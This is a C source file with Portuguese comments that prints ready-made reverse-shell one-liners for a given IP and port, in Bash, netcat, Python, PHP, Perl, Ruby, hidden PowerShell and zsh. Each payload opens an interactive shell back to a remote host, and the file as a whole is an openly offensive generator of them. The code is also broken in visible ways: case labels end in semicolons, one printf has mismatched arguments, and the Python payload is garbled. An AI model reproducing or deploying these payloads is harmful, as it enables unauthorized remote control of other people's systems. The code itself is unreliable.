#include <stdio.h>
#include <string.h>

void ajuda(){
  printf("\nReverse Shells from: \x1b[32mrevshells.com\x1b[00m\nUso: ./revs <IP> <PORT> <OPTION>\n\n");
  printf("\n1 >> Bash\n2 >> nc\n3 >> Python\n4 >> PHP\n5 >> Perl\n6 >> Ruby\n7 >> PowerShell\n8 >> zSh\n");
}

// ArgV --> Vetor de char que contém os argumentos   == (Array de strings)
//          argv[0] será o nome do programa executado
// ArgC --> Valor inteiro que indica a quantidade    == (É um Inteiro(int) que indica quantos argumentos foram passados na linha de comando)
//          de argumentos que foram passados para
//          chamar o programa
int main(int argc, char *argv[]){
  // Se não houverem 4 argumentos
  // OU o comprimento(string length) do argv 1 for maior que 40
  // OU o comprimento do argv 2 for maior que 5
  // OU o comprimento do argv 3 for diferente de 1
  if(argc != 4 || strlen(argv[1]) > 40 || strlen(argv[2]) > 5 || strlen(argv[3]) != 1){
    ajuda();
    return 0;
  }


  switch (argv[3][0]){
    case '1':
      printf(">> Bash:\n/bin/bash -i >& /dev/tcp/%s/%s 0>&1\nbash -i >& /dev/tcp/%s/%s 0>&1\n", argv[1], argv[2]);
      break;

    case '2';
      printf(">> nc:\nnc -e /bin/bash %s %s\n", argv[1], argv[2]);
      break;

    case '3';
      printf(">> Python:\npython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect.SOCK_STREAM((\"%s\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\"]);'\n", argv[1], argv[2]);
      break;

    case '4';
      printf(">> PHP:\nphp -r '$sock=fsockopen(\"%s\",%s);exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n", argv[1], argv[2]);
      break;

    case '5';
      printf(">> Perl:\nperl -e 'use Socket;$i=\"%s\";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");};'", argv[1], argv[2]);
      break;

    case '6';
      printf(">> Ruby:\nruby -rsocket -e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"%s\",%s))'", argv[1], argv[2]);
      break;

    case '7';
      printf(">> PowerShell:\npowershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"%s\",%s);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\n", argv[1], argv[2]);
      break;

    case '8';
      printf(">> zSh:\nzsh -c 'zmodload zsh/net/tcp && ztcp %s %s && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'", argv[1], argv[2]);
      break;
    default:
      printf("Opção errada!");
      return 1;
    }
  return 0;

}
